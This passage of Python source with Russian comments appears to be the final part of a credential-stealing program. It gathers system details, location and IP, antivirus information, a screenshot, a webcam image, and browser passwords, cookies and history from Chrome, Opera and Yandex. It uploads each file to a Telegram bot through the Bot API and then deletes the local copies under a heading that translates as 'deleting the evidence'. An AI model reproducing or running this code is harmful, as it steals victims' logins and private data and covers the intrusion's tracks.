    all_data = "Time: " + time.asctime() + '\n' + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
    file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") 
    file.write(all_data)
    file.write('\nАнтивирус: '+str(Antiviruses))
except:
    print('Что то то с alldata не так')
try:
    file.write(str(gpu_name) + str(gpu_free_memory) + str(gpu_total_memory) + str(gpu_temperature))
except:
    print()

file.close()

################################################################################
#                             ДЕЛАЕМ СКРИНШОТ                                  #
################################################################################
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

################################################################################
#                             ПОЛУЧАЕМ ДИРЕКТОРИИ                              #
################################################################################
webcam = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\4543t353454.png')

alldata_direct = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
screenshot = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
history_direct = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.txt')
chromepass = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromepasswords.txt')
chromecokk= (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromecookie.txt')


history_direct_opera = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOPERA.txt')
operapass = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operapasswords.txt')
operacokk= (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operacookie.txt')

history_direct_yandex = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.txt')
yandexpass = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexpasswords.txt')
yandexcokk= (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexcookie.txt')
################################################################################
#                              ОТПРАВКА                                        #
################################################################################

url = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(webcam, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(alldata_direct, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')


try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(screenshot, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(history_direct, 'rb')})

except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(chromepass, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(chromecokk, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')









try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(history_direct_opera, 'rb')})

except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(operapass, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(operacokk, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')




try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(history_direct_yandex, 'rb')})

except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(yandexpass, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post(url,files={"document": open(yandexcokk, 'rb')})
except:
    print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')


################################################################################
#                              УДАЛЕНИЕ УЛИК :)                                #
################################################################################
try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.png')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\4543t353454.png')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromepasswords.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromecookie.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Cookies.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operapasswords.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOPERA.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operacookie.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\CookiesOpera.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOpera.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexpasswords.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.txt')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexcookie.txt')		
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\CookiesYandex.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.db')
except:
	print()

try:
	os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
except:
	print()